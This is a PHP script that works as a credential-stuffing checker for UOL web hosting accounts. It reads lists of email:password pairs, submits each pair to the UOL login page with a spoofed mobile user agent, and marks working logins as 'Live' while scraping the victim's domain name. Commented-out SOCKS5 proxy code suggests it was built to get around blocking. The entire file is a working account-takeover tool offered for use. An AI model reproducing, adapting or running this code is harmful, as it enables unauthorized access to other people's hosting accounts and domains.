<?php
require ('./class_curl.php');

function getStr($string,$start,$end){
	$str = explode($start,$string);
	$str = explode($end,$str[1]);
	return $str[0];
}


if ($_POST['do'] == 'check')
{

    $curl = new curl();
    delete_cookies();
    $curl->ua('Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16');
 

    $result = array();
    $delim = urldecode($_POST['delim']);
    list($email, $pwd) = explode($delim, urldecode($_POST['mailpass']));
//   $sock = urldecode($_POST['IP']);

    if (!$email)
    {
        $result['error'] = -1;
        $result['msg'] = urldecode($_POST['mailpass']);
        echo json_encode($result);
        exit;
    }
    
    delete_cookies();
 //  $curl->sock5($sock);

	if($curl->validate()){
		$fullink='https://painelhost.uol.com.br/acesso.html?reminder=false&emailLogin='.$email.'&password='.$pwd.'&enviar=';
		$curl->page($fullink);
		
		if($curl->validate()){
		
		
		//	file_put_contents('2.html', $curl->content);
			 
			 if(stripos($curl->content, 'Hospedagem de Sites') !== false){
       $curl->page('https://dominios.uol.com.br/controlPanel.html');
       $cc = getStr($curl->content,'class="img-ativo">','</div>');
       $cc1 = str_replace(' ','',$cc);
       $cc2 = str_replace('\n','',$cc1);
       $cc3 = str_replace('\r\n','',$cc2);
       $result['error'] = 0;
       $result['msg'] = '<b style="color:blue;">Live</b> => '. $sock . ' | '. $email .' | ' .$pwd.'| Dominio:<b style="color:red;">'.$cc1.'</b> | www.technologychecker.us';

			 }
			 //var message={
			 elseif(substr_count($curl->content, 'O e-mail ou senha informados estão incorretos') !== false){
			 
				$result['error'] = 2;
                $result['msg'] = '<b style="color:red;">Die</b> => ' . $email . ' | ' . $pwd.' | Checked'; 
			 }
			
			 else{
			 
					 
			 	$result['error'] = 2;
                $result['msg'] = '<b style="color:red;">Can Check</b> => ' . $email . ' | ' . $pwd.' | Ckecked'; 
			 }
			
							
		}else{
	
	
		$result['error'] = 1;
        $result['msg'] = $sock . ' => Die/Timeout1';
	
		}	
		
	
	
	}else{
	
	
		$result['error'] = 1;
        $result['msg'] = $sock . ' => Die/Timeout1';
	
	}
	
	

    echo json_encode($result);
    exit;

}

?>